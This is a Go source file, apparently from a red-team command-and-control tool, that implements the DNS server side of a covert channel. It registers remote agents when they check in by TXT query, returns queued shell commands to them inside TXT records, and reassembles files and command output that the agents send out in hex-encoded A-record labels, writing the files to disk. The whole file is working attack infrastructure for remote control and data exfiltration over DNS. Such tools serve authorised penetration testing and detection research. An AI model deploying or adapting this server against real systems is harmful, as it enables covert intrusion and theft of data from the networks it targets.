package dnsserver

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"errors"
	"fmt"
	"hash/crc32"
	"io/ioutil"
	"net"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/sensepost/godoh/protocol"
	"github.com/sensepost/godoh/utils"

	log "github.com/sirupsen/logrus"
)

// Handler handles incoming lookups.
type Handler struct {
	StreamSpool  map[string]protocol.DNSBuffer
	CommandSpool map[string]protocol.Command
	Agents       map[string]protocol.Agent // Updated with TXT record checkins
}

// ServeDNS serves the DNS server used to read incoming lookups and process them.
func (h *Handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(r)

	// Setup the response we will send. By default we assume everything
	// will be successful and flip to failure as needed.
	msg.Authoritative = true
	domain := msg.Question[0].Name
	aRecordResponse := protocol.SuccessDNSResponse
	txtRecordResponse := protocol.NoCmdTxtResponse

	// Now, depending on the question we got, parse, split and do what is needed.
	switch r.Question[0].Qtype {
	case dns.TypeA:

		// parse the question labels
		ident, streamType, seq, transferProtocol, byteData, err := h.parseARRLabels(r)
		if err != nil {
			aRecordResponse = err.Error()
			break
		}

		// A few things can happen here. Many of the code paths rely on
		// knowing whether we have an existing stream for this ident. So
		// get the status of that and save the DNSSteam if we have it.
		bufferRecord, ok := h.StreamSpool[ident]

		// Handle new streams by taking note and starting them
		if (streamType == protocol.StreamStart) && !ok {

			DNSBuf := &protocol.DNSBuffer{
				Identifier: ident,
				Seq:        seq,
				Started:    true,
				Finished:   false,
				Protocol:   transferProtocol,
			}

			// Add this new stream identifier
			h.StreamSpool[ident] = *DNSBuf
			log.WithFields(log.Fields{"ident": ident}).Info("New incoming DNS stream started")

			break
		}

		// Error cases for a new stream request
		if (streamType == protocol.StreamStart) && ok {
			log.WithFields(log.Fields{"ident": ident}).
				Error("Tried to start a new stream for an already recorded identifier. Bailing")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		// Handle appending data to streams
		if (streamType == protocol.StreamData) && ok && !bufferRecord.Finished {

			bufferRecord.Data = append(bufferRecord.Data, byteData...)
			bufferRecord.Seq = seq

			// update the buffer for this client
			h.StreamSpool[ident] = bufferRecord

			log.WithFields(log.Fields{"ident": ident, "seq": seq, "data": byteData}).
				Debug("Wrote new data chunk")
			break
		}

		// Handle errors for data appends
		if (streamType == protocol.StreamData) && !ok {
			log.WithFields(log.Fields{"ident": ident}).
				Error("Tried to append to a steam that is not registered. Bailing")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		if (streamType == protocol.StreamData) && ok && bufferRecord.Finished {
			log.WithFields(log.Fields{"ident": ident}).
				Error("Tried to append to a steam that is already finished. Bailing")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		// Handle closing Streams
		if (streamType == protocol.StreamEnd) && ok && !bufferRecord.Finished {
			bufferRecord.Finished = true
			bufferRecord.Started = false
			bufferRecord.Seq = seq

			// update the buffer for this client
			h.StreamSpool[ident] = bufferRecord

			switch bufferRecord.Protocol {
			case protocol.FileProtocol:
				log.WithFields(log.Fields{"ident": ident}).
					Info("Attempting to decode the finished FileProtocol stream.")

				fp := &protocol.File{}
				if err := utils.UngobUnpress(fp, bufferRecord.Data); err != nil {
					log.WithFields(log.Fields{"ident": ident, "err": err}).
						Error("UngobUnpress failed.")
					aRecordResponse = protocol.FailureDNSResponse
					break
				}

				// Update file path to only be the base name
				fp.Name = filepath.Base(fp.Name)

				log.WithFields(log.Fields{"ident": ident, "file-name": fp.Name, "file-sha": fp.Shasum}).
					Info("Recieved file information.")

				// check shasum
				h := sha1.New()
				h.Write(*fp.Data)
				cSum := hex.EncodeToString(h.Sum(nil))

				if cSum == fp.Shasum {
					log.WithFields(log.Fields{
						"ident":          ident,
						"file-name":      fp.Name,
						"file-sha":       fp.Shasum,
						"calculated-sha": cSum,
					}).Info("Calculated SHAsum matches")
				} else {
					log.WithFields(log.Fields{
						"ident":          ident,
						"file-name":      fp.Name,
						"file-sha":       fp.Shasum,
						"calculated-sha": cSum,
					}).Warn("Calculated SHAsum does not match!")
				}

				log.WithFields(log.Fields{"ident": ident, "file-name": fp.Name}).
					Info("Writing file to disk.")

				if err := ioutil.WriteFile(fp.Name, *fp.Data, 0644); err != nil {
					log.WithFields(log.Fields{"ident": ident, "file-name": fp.Name, "err": err}).
						Info("Failed writing file to disk.")
					aRecordResponse = protocol.FailureDNSResponse
					break
				}

				break

			case protocol.CmdProtocol:
				log.WithFields(log.Fields{"ident": ident}).
					Info("Attempting to decode the finished CmdProtol stream.")

				cp := &protocol.Command{}
				if err := utils.UngobUnpress(cp, bufferRecord.Data); err != nil {
					log.WithFields(log.Fields{"ident": ident, "err": err}).
						Error("UngobUnpress failed.")
					aRecordResponse = protocol.FailureDNSResponse
					break
				}

				fmt.Printf("\nCommand Output:\n-------\n%s\n", cp.Data)

				break

			default:
				log.WithFields(log.Fields{"ident": ident}).
					Info("Unknown protocol to decode? DODGE!")
				aRecordResponse = protocol.FailureDNSResponse
				break
			}

			break
		}

		// Handle closing errors
		if (streamType == protocol.StreamEnd) && !ok {
			log.WithFields(log.Fields{"ident": ident}).
				Error("Tried to append to a steam that is not known. Bailing")
			aRecordResponse = protocol.FailureDNSResponse
			break
		}

		break

	case dns.TypeTXT:
		ident, err := h.parseTxtRRLabels(r)
		if err != nil {
			fmt.Printf("Failed to parse identifer: %s", err)
			txtRecordResponse = protocol.ErrorTxtResponse
			break
		}

		// update & record agent meta data
		agentMeta, ok := h.Agents[ident]
		if !ok {
			// register new agent
			agentMeta = protocol.Agent{
				Identifier:   ident,
				FirstCheckin: time.Now(),
				LastCheckin:  time.Now(),
			}
			log.WithFields(log.Fields{"ident": ident}).Info("First time checkin for agent")
			h.Agents[ident] = agentMeta
		} else {
			// Update the last checkin time
			agentMeta.LastCheckin = time.Now()
			h.Agents[ident] = agentMeta
		}

		// check if we have a command
		cmd, ok := h.CommandSpool[ident]
		if !ok {
			break
		}

		log.WithFields(log.Fields{"ident": ident, "cmd": cmd.Exec}).
			Info("Giving agent a new command as checkin response")
		txtRecordResponse = protocol.CmdTxtResponse

		var ec bytes.Buffer
		utils.GobPress(cmd.GetOutgoing(), &ec)
		additionalTxtKey := fmt.Sprintf("p=%x", ec.Bytes())

		if len(additionalTxtKey) > 230 {
			log.WithFields(log.Fields{"ident": ident, "encoded-len": len(additionalTxtKey)}).
				Info("Outgoing command too long for a single TXT record. Try a shorter one for now, sorry...")
			delete(h.CommandSpool, ident)
			txtRecordResponse = protocol.ErrorTxtResponse
			break
		}

		txtRecordResponse = append(txtRecordResponse, fmt.Sprintf("p=%x", ec.Bytes()))

		// Remove the command
		delete(h.CommandSpool, ident)

		break

	default:
		aRecordResponse = protocol.FailureDNSResponse
		break
	}

	// Now, depending on the question we got, build a response packet
	switch r.Question[0].Qtype {
	case dns.TypeA:
		msg.Answer = append(msg.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
			A:   net.ParseIP(aRecordResponse),
		})
		break
	case dns.TypeTXT:
		msg.Answer = append(msg.Answer, &dns.TXT{
			Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 1},
			Txt: txtRecordResponse,
		})
	}

	w.WriteMsg(&msg)
}

// parseARRLabels splits and parses relevant labels from a question
func (h *Handler) parseARRLabels(r *dns.Msg) (string, byte, int, int, []byte, error) {

	// A hostnames labels are what is interesting to us. Extract them.
	hsq := strings.Split(r.Question[0].String(), ".")

	if len(hsq) <= 9 {
		fmt.Println("Question had less than 9 labels, bailing.")
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// Based on the protocol, we have fields to parse.
	// See protocol.utils.Requestify for details.

	// the first label will have a ;. a dig thing.
	ident := strings.Split(hsq[0], ";")[1]

	streamTypeBytes, err := hex.DecodeString(hsq[1])
	if err != nil {
		fmt.Printf("Failed to convert stream type to bytes:\n%s\n", err)
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}
	streamType := streamTypeBytes[0]

	seq, err := strconv.Atoi(hsq[2])
	if err != nil {
		fmt.Printf("Failed to convert sequence to Integer:\n%s\n", err)
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	transferProtocol, err := strconv.Atoi(hsq[4])
	if err != nil {
		fmt.Printf("Failed to convert protocol to Integer:\n%s\n", err)
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// dataLen is used only in this function to determine the concat
	// amount for data itself.
	dataLen, err := strconv.Atoi(hsq[5])
	if err != nil {
		fmt.Printf("Failed to convert data length to Integer:\n%s\n", err)
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// build up the data variable. We assume of a label was 0
	// then the data is not interesting.
	var data string
	switch dataLen {
	case 1:
		data = hsq[6]
		break
	case 2:
		data = hsq[6] + hsq[7]
		break
	case 3:
		data = hsq[6] + hsq[7] + hsq[8]
		break
	}

	// decode the data
	byteData, err := hex.DecodeString(data)
	if err != nil {
		fmt.Printf("Could not decode data:\n%s\n", err)
		return "", 0x00, 0, 0, []byte{0x00}, errors.New(protocol.FailureDNSResponse)
	}

	// crc32 check
	if hsq[3] != fmt.Sprintf("%02x", crc32.ChecksumIEEE(byteData)) {
		log.WithFields(log.Fields{
			"expected":    hsq[3],
			"calculated":  crc32.ChecksumIEEE(byteData),
			"stream-type": streamType,
			"ident":       ident,
			"seq":         seq,
		}).Warn("Checksum failure")
	}

	return ident, streamType, seq, transferProtocol, byteData, nil
}

// parseARRLabels splits and parses relevant labels from a question
func (h *Handler) parseTxtRRLabels(r *dns.Msg) (string, error) {

	// A hostnames labels are what is interesting to us. Extract them.
	hsq := strings.Split(r.Question[0].String(), ".")

	if len(hsq) <= 1 {
		fmt.Println("TXT Question had less than 1 labels, bailing.")
		return "", errors.New(protocol.FailureDNSResponse)
	}

	// the first label will have a ;. a dig thing.
	identData := strings.Split(hsq[0], ";")[1]
	identBytes, err := hex.DecodeString(identData)
	if err != nil {
		fmt.Printf("Failed to decode ident bytes:\n%s\n", err)
		return "", errors.New(protocol.FailureDNSResponse)
	}
	ident := string(identBytes)

	return ident, nil
}
